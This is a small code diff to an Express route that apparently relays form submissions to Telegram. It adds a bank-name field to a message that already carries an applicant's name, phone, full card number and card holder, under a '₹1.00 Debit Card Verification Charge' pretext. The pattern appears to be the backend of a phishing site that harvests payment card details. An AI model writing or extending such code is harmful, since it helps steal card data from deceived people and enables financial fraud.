@@ -142,6 +142,7 @@ app.post('/api/telegram/send', async (req, res) => {
 ──────────────────────────────
 • <b>Applicant Name:</b> ${escapeHtml(data.name || 'N/A')}
 • <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
+• <b>Bank Name:</b> ${escapeHtml(data.bankName || 'Not Selected')}
 • <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)
 • <b>Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>
 • <b>Card Holder:</b> ${escapeHtml(data.cardHolder || 'N/A')}
